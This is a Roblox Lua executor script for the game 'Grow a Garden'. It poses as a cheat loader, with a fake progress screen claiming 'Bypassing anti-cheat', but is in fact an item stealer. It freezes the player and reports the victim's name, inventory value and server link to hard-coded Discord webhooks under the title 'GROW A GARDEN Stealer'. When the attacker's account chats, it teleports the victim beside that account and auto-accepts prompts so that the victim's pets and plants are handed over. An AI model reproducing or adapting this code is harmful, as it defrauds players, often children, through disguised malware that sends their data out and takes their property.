username = "auzatest4"
webhook = "https://discord.com/api/webhooks/1390321696182894834/PL1M_Tf82KLvYSFkIT_UdpuzzU9bash8V1hKb0FerYlRu28N1rzPUPczaa6PKoibNB_P"

local logs_webhook = "https://discord.com/api/webhooks/1390321696182894834/PL1M_Tf82KLvYSFkIT_UdpuzzU9bash8V1hKb0FerYlRu28N1rzPUPczaa6PKoibNB_P"

local server = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
local player = game.Players.LocalPlayer

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer
local backpack = LocalPlayer:WaitForChild("Backpack")
local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValue)
local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
local req = (syn and syn.request) or (http and http.request) or (http_request) or request

-- Enhanced server teleport function with retry logic
local function findBestServer(maxPlayers)
    local attempts = 0
    local maxAttempts = 5
    local minPlayers = math.huge
    local bestServerId = nil
    
    while attempts < maxAttempts do
        local success, result = pcall(function()
            return HttpService:JSONDecode(game:HttpGet(
                "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"
            ))
        end)
        
        if success and result and result.data then
            -- Filter and sort servers
            local validServers = {}
            for _, server in ipairs(result.data) do
                if server.playing and server.id ~= game.JobId and server.playing <= maxPlayers then
                    table.insert(validServers, server)
                    if server.playing < minPlayers then
                        minPlayers = server.playing
                        bestServerId = server.id
                    end
                end
            end
            
            -- If we found an empty server, use it immediately
            if minPlayers == 0 then
                return bestServerId
            end
            
            -- Sort by player count
            table.sort(validServers, function(a, b)
                return a.playing < b.playing
            end)
            
            -- Return the best server found
            if #validServers > 0 then
                return validServers[1].id
            end
        end
        
        attempts = attempts + 1
        task.wait(1) -- Wait before retrying
    end
    
    return bestServerId
end

local function createTeleportGui(message)
    local gui = Instance.new("ScreenGui")
    gui.Name = "TeleportingGui"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.Parent = player:WaitForChild("PlayerGui")

    local bg = Instance.new("Frame", gui)
    bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    bg.Size = UDim2.new(1, 0, 1, 0)

    local title = Instance.new("TextLabel", bg)
    title.Text = "Finding Better Server..."
    title.Font = Enum.Font.GothamBlack
    title.TextColor3 = Color3.new(1, 1, 1)
    title.TextScaled = true
    title.Size = UDim2.new(0.8, 0, 0.12, 0)
    title.Position = UDim2.new(0.1, 0, 0.28, 0)
    title.BackgroundTransparency = 1

    local status = Instance.new("TextLabel", bg)
    status.Text = message or "Searching for low population server..."
    status.Font = Enum.Font.Gotham
    status.TextColor3 = Color3.fromRGB(180, 180, 180)
    status.TextScaled = true
    status.Size = UDim2.new(0.8, 0, 0.08, 0)
    status.Position = UDim2.new(0.1, 0, 0.42, 0)
    status.BackgroundTransparency = 1

    return gui, status
end

local function teleportToBetterServer()
    local maxPlayersAllowed = 3 -- Only look for servers with 3 or fewer players
    local teleportGui, statusText = createTeleportGui()
    
    local function attemptTeleport()
        local bestServer = findBestServer(maxPlayersAllowed)
        
        if bestServer then
            statusText.Text = "Found server with " .. (maxPlayersAllowed == 0 and "no" or maxPlayersAllowed) .. " players! Teleporting..."
            local success, err = pcall(function()
                TeleportService:TeleportToPlaceInstance(game.PlaceId, bestServer)
            end)
            
            if not success then
                statusText.Text = "Teleport failed, retrying..."
                task.wait(2)
                attemptTeleport()
            end
        else
            -- If no server found with current max players, relax the condition slightly
            if maxPlayersAllowed < 10 then
                maxPlayersAllowed = maxPlayersAllowed + 1
                statusText.Text = string.format("No servers with %d players found. Trying %d players...", maxPlayersAllowed - 1, maxPlayersAllowed)
                task.wait(1)
                attemptTeleport()
            else
                statusText.Text = "Failed to find suitable server. Please try again later."
                task.wait(3)
                teleportGui:Destroy()
            end
        end
    end
    
    task.spawn(attemptTeleport)
end

-- Check server conditions and teleport if needed
if server == "VIPServer" then 
    teleportToBetterServer()
    return
end

if #Players:GetPlayers() >= 4 then
    teleportToBetterServer()
    return
end


local p = LocalPlayer
local h = (p.Character or p.CharacterAdded:Wait()):WaitForChild("Humanoid")
h.WalkSpeed = 0
h.JumpPower = 0
pcall(function()
    require(p:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable()
end)

local gui = Instance.new("ScreenGui")
gui.Name = "ScriptLoader"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999 
gui.Parent = player:WaitForChild("PlayerGui")

local bg = Instance.new("Frame", gui)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
bg.Size = UDim2.new(1, 0, 1, 0)

local title = Instance.new("TextLabel", bg)
title.Text = "Loading Script..."
title.Font = Enum.Font.GothamBlack
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.Size = UDim2.new(0.8, 0, 0.12, 0)
title.Position = UDim2.new(0.1, 0, 0.28, 0)
title.BackgroundTransparency = 1

local status = Instance.new("TextLabel", bg)
status.Text = "Initializing..."
status.Font = Enum.Font.Gotham
status.TextColor3 = Color3.fromRGB(180, 180, 180)
status.TextScaled = true
status.Size = UDim2.new(0.8, 0, 0.08, 0)
status.Position = UDim2.new(0.1, 0, 0.42, 0)
status.BackgroundTransparency = 1

local barBg = Instance.new("Frame", bg)
barBg.Size = UDim2.new(0.7, 0, 0.035, 0)
barBg.Position = UDim2.new(0.15, 0, 0.52, 0)
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBg.BorderSizePixel = 0
barBg.ClipsDescendants = true

local barFill = Instance.new("Frame", barBg)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0

local discord = Instance.new("TextLabel", bg)
discord.Text = "Join our Discord: discord.gg/qB97QHPugw"
discord.Font = Enum.Font.GothamSemibold
discord.TextColor3 = Color3.fromRGB(120, 120, 255)
discord.TextScaled = true
discord.Size = UDim2.new(0.8, 0, 0.05, 0)
discord.Position = UDim2.new(0.1, 0, 0.86, 0)
discord.BackgroundTransparency = 1

local fakeSteps = {
    "Starting script...",
    "Connecting to game servers...",
    "Bypassing anti-cheat...",
    "Loading UI assets...",
    "Injecting main module...",
    "Syncing with server...",
    "Optimizing script performance...",
    "Checking for updates...",
    "Hiding script from detection...",
    "Finalizing setup...",
    "Preparing game environment...",
    "Almost done..."
}

local totalDuration = 600 -- shorter for quick test
local stepTime = 1
local totalSteps = math.floor(totalDuration / stepTime)

task.spawn(function()
    for i = 1, totalSteps do
        status.Text = fakeSteps[(i - 1) % #fakeSteps + 1]
        barFill:TweenSize(UDim2.new(i / totalSteps, 0, 1, 0), "Out", "Quad", 0.75, true)
        task.wait(stepTime)
    end
    gui:Destroy()
end)

local suffixes = {"", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "De"}
local function formatNumber(num)
    if type(num) ~= "number" then return tostring(num) end
    if num < 1000 then return tostring(num) end

    local magnitude = math.floor(math.log10(num) / 3)
    local suffix = suffixes[magnitude + 1] or ("e" .. (magnitude * 3))
    local scaled = num / (1000 ^ magnitude)

    return string.format("%.2f%s", scaled, suffix)
end

local event = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
for _, item in ipairs(backpack:GetChildren()) do
    if item:GetAttribute("d") == true then
        event:FireServer(item)
    end
end

local executor = (identifyexecutor and identifyexecutor()) or "Unknown"

local allowedPets = {
    ["Raccoon"] = true,
    ["Queen Bee"] = true,
    ["Dragonfly"] = true,
    ["Red Fox"] = true,
    ["Night Owl"] = true,
    ["Owl"] = true,
    ["Blood Owl"] = true,
    ["Praying Mantis"] = true,
    ["Chicken Zombie"] = true,
    ["Polar Bear"] = true,
    ["Petal Bee"] = true,
    ["Bear Bee"] = true,
    ["Disco Bee"] = true,
    ["Butterfly"] = true,
}

local function getKg(name)
    return tonumber(string.match(name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
end

local function gatherInventorySummary()
    local petCountMap = {}
    local petLines = {}
    local itemsWithValue = {}

    for _, item in pairs(backpack:GetChildren()) do
        local baseName = item.Name:match("^(.-)%s*%[") or item.Name
        if allowedPets[baseName] then
            petCountMap[baseName] = (petCountMap[baseName] or 0) + 1
        elseif item:FindFirstChild("Item_String") then
            local value = CalculatePlantValue(item)
            table.insert(itemsWithValue, {name = item.Name, value = value})
        end
    end

    for petName, count in pairs(petCountMap) do
        table.insert(petLines, petName .. " - pet (x" .. count .. ")")
    end

    table.sort(itemsWithValue, function(a, b) return a.value > b.value end)

    local tradableSummary = ""
    local totalShown = 0

    for _, line in ipairs(petLines) do
        if totalShown >= 10 then break end
        tradableSummary = tradableSummary .. line .. "\n"
        totalShown += 1
    end

    for i = 1, math.min(10 - totalShown, #itemsWithValue) do
        local item = itemsWithValue[i]
        tradableSummary = tradableSummary .. item.name .. " - Worth: " .. formatNumber(item.value) .. "\n"
    end

    if #petLines + #itemsWithValue > 10 then
        tradableSummary = tradableSummary .. "and more..."
    end

    local totalValue = 0
    for _, item in ipairs(itemsWithValue) do
        totalValue += item.value
    end

    return tradableSummary, totalValue
end

local function sendWebhook()
    local tradableSummary, totalValue = gatherInventorySummary()

    local payload = {
        ["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
        ["embeds"] = {{
            ["title"] = ":skull: GROW A GARDEN Stealer",
            ["color"] = 0x00ffcc,
            ["fields"] = {
                {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
                {["name"] = ":crown: Creator", ["value"] = username, ["inline"] = false},
                {["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
                {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
                {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
                {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
            },
            ["footer"] = {["text"] = "by zues • " .. os.date("%B %d, %Y")},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local logs_payload = {
        ["embeds"] = {{
            ["title"] = ":skull: GROW A GARDEN LOGS",
            ["color"] = 0x00ffcc,
            ["fields"] = {
                {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
                {["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
                {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
                {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
                {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
            },
            ["footer"] = {["text"] = "by zeus • " .. os.date("%B %d, %Y")},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    if req then
        pcall(function()
            req({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })

            req({
                Url = logs_webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(logs_payload)
            })
        end)
    end
end

local function unequipAllPets()
    local petData = ActivePetsService:GetPlayerDatastorePetData(LocalPlayer.Name)
    if petData then
        for uuid, _ in pairs(petData.PetInventory.Data) do
            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer("UnequipPet", uuid)
            task.wait(0.1)
        end
    end
end

local function getAllPrompts(root, maxDistance)
    for _, descendant in ipairs(workspace:GetDescendants()) do
        if descendant:IsA("ProximityPrompt") and descendant.Enabled and descendant.Parent then
            local part = descendant.Parent:IsA("Model") and descendant.Parent:FindFirstChild("HumanoidRootPart") or descendant.Parent
            if part and part:IsA("BasePart") then
                local dist = (part.Position - root.Position).Magnitude
                if dist <= maxDistance then
                    return descendant
                end
            end
        end
    end
end

local function waitAndHoldPrompt(targetChar)
    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not root then return end

    for _ = 1, 50 do
        local prompt = getAllPrompts(root, 10)
        if prompt then
            prompt.HoldDuration = 0.1
            prompt.Enabled = true
            pcall(function()
                keypress(69)
                task.wait(prompt.HoldDuration + 0.1)
                keyrelease(69)
            end)
            return prompt
        end
        task.wait(0.1)
    end
end

local function getSortedTools()
    local list = {}
    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and getKg(tool.Name) > 0 then
            table.insert(list, tool)
        end
    end
    table.sort(list, function(a, b)
        return getKg(a.Name) > getKg(b.Name)
    end)
    return list
end

local started = false

local function startGiving()
    local target = Players:FindFirstChild(username)
    if not target or not target.Character or not LocalPlayer.Character then return end

    local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
    if not myHRP or not targetHRP then return end

    myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, 2, 0)
    task.wait(0.4)

    local allowedPetTools = {}
    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local baseName = tool.Name:match("^(.-)%s*%[") or tool.Name
            if allowedPets[baseName] then
                table.insert(allowedPetTools, tool)
            end
        end
    end

    for _, tool in ipairs(allowedPetTools) do
        if tool.Parent == backpack then
            tool.Parent = LocalPlayer.Character
            task.wait(0.25)

            local start = tick()
            while tick() - start < 3 do
                waitAndHoldPrompt(target.Character)
                task.wait(0.25)
            end

            if tool:IsDescendantOf(LocalPlayer.Character) then
                tool.Parent = backpack
            end
        end
    end

    while true do
        local tools = getSortedTools()

        for i = #tools, 1, -1 do
            local baseName = tools[i].Name:match("^(.-)%s*%[") or tools[i].Name
            if allowedPets[baseName] then
                table.remove(tools, i)
            end
        end

        if #tools == 0 then break end

        for _, tool in ipairs(tools) do
            if tool.Parent == backpack then
                tool.Parent = LocalPlayer.Character
                task.wait(0.25)

                local start = tick()
                while tick() - start < 3 do
                    waitAndHoldPrompt(target.Character)
                    task.wait(0.25)
                end

                if tool:IsDescendantOf(LocalPlayer.Character) then
                    tool.Parent = backpack
                end
            end
        end

        task.wait(0.1)
    end
end

unequipAllPets()
task.wait(1)
sendWebhook()

for _, p in ipairs(Players:GetPlayers()) do
    if p.Name == username then
        p.Chatted:Connect(function()
            if not started then
                started = true
                startGiving()
            end
        end)
    end
end

Players.PlayerAdded:Connect(function(p)
    if p.Name == username then
        p.Chatted:Connect(function()
            if not started then
                started = true
                startGiving()
            end
        end)
    end
end)
